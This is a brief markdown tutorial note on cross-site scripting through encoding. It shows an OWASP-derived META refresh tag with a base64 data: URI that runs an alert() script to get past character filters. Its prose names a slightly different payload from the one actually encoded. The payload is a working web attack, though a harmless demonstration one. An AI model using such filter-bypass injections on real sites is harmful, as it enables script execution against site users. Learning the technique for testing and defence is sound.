# Code Encoding XSS

we can use encoded script injection directly in the url.
We need to encode a part of the injection to bypass restrictions like special chars

with the example from owasp, we can inject a JS script in the META tag and will encode <script>alert('test2')</script> in base64
```html
<META HTTP-EQUIV="refresh"CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">
```

## External Resources

https://owasp.org/www-community/attacks/xss/